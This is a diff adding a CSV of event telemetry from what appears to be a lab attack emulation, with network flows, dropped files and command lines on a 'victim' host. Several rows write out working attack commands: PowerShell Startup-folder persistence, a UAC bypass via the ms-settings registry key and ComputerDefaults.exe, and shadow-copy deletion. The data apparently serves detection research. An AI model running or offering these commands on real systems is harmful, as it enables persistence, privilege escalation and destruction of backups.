@@ -1,0 +1,27 @@
+ac087386-cc0d-4498-b21f-460c4ece45e7,{'netflow': '192.168.56.102:57292->192.168.56.101:16415'},807
+eb5c9e70-a67d-4db4-874d-1c521d93a081,{'netflow': '192.168.56.102:57548->192.168.56.101:16415'},825
+399d27d1-00ba-4b6f-ae9a-92663a006c3d,{'netflow': '192.168.56.102:57804->192.168.56.101:16415'},826
+f7485dc6-43cf-4065-b20c-f1c1ec3ee6b6,{'netflow': '192.168.56.102:58828->192.168.56.101:16415'},864
+5e74fbff-750d-40f6-8b84-d2c51c71f202,{'netflow': '192.168.56.102:59084->192.168.56.101:16415'},865
+87572acf-85a5-4863-a64a-1a4f9e7a0c0b,{'netflow': '192.168.56.102:59596->192.168.56.101:16415'},869
+96df45e8-4238-4070-a847-6b6a0bf68a6d,{'netflow': '192.168.56.102:59852->192.168.56.101:16415'},870
+637499a9-c1ff-4436-b763-cc0067cd9010,{'file': 'C:\\Users\\victim\\Downloads\\REASONABLE_GRASS.dll'},915
+245d5d4d-88ca-4255-8494-09603689f98c,{'subject': 'regsvr32  C:\\Users\\victim\\Downloads\\REASONABLE_GRASS.dll'},1777
+75dfaadf-8662-408f-bbb4-4d3e19706b50,{'netflow': '192.168.56.102:63692->192.168.56.101:53764'},1780
+a0f4deeb-b266-47e9-a0e8-be7105be62f7,{'netflow': '192.168.56.102:64716->192.168.56.101:16415'},1834
+9ed406b4-d9a4-4d6d-920f-96638b334ec7,{'netflow': '192.168.56.102:64972->192.168.56.101:16415'},1835
+8c6c96a8-3cba-4066-a154-e43e5e9a20a8,{'netflow': '192.168.56.102:65228->192.168.56.101:16415'},1836
+8843fb93-af95-4ba6-941c-6948c292efcd,{'file': 'C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe'},2705
+a46b38b6-90ab-44bf-9615-2e13b648e26b,"{'subject': 'powershell.exe -Command ""New-Item -ItemType Directory -path \\""$env:APPDATA\\Microsoft\\Windows\\Update\\\\\\""""'}",7052
+834e9c5b-9489-47de-b2b5-fe8f4c13a017,"{'subject': 'powershell.exe -Command ""Copy-Item -path \\""C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe\\"" -destination \\""$env:APPDATA\\Microsoft\\Windows\\Update\\\\\\""""'}",7209
+9ecc26ac-44c3-4242-bca0-13361763d1f4,"{'subject': 'powershell.exe -Command ""Set-ItemProperty -Path  \\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\"" -Name \\""Startup\\"" -Value \\""$env:APPDATA\\Microsoft\\Windows\\Update\\\\\\""""'}",7299
+661791d2-3887-475f-90f8-083e6b6dae6c,"{'subject': 'powershell.exe -Command ""New-Item \\""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"" -Force""'}",8087
+d10d9508-dd97-4bc8-b763-3df874e80d7a,"{'subject': 'powershell.exe -Command ""New-ItemProperty \\""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"" -Name \\""DelegateExecute\\"" -Value \\""\\"" -Force""'}",8213
+6dacfb76-d4c6-4c60-8435-2cb3e3815b6a,"{'subject': 'powershell.exe -Command ""Set-ItemProperty \\""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"" -Name \\""(default)\\"" -Value \\""C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe\\"" -Force""'}",8337
+7c7166d2-1f53-4421-a16e-ee9a8492baca,"{'subject': 'powershell.exe -Command ""Start-Process \\""C:\\Windows\\System32\\ComputerDefaults.exe\\""""'}",8445
+6bd8f874-a639-4a60-bee1-3699c31d98c1,"{'subject': '""C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe"" '}",8568
+0fc879d2-0ed8-412d-9c82-efd8855f9311,{'file': 'PERFECT_AGLET.exe'},8569
+788c01fb-6648-43ee-ad91-bddd1a6cce6d,{'netflow': '192.168.56.102:717->192.168.56.101:10505'},8581
+a615f938-7ba2-4c03-b34a-673c878f2b8f,"{'subject': '""C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe"" '}",10453
+712f4eeb-c116-47a9-b20b-c1767f7e1cd7,{'netflow': '192.168.56.102:1741->192.168.56.101:10505'},10454
+333e8522-2579-496a-b590-2f07cd47afc5,"{'subject': 'cmd.exe /c ""wmic.exe shadowcopy delete""'}",10645
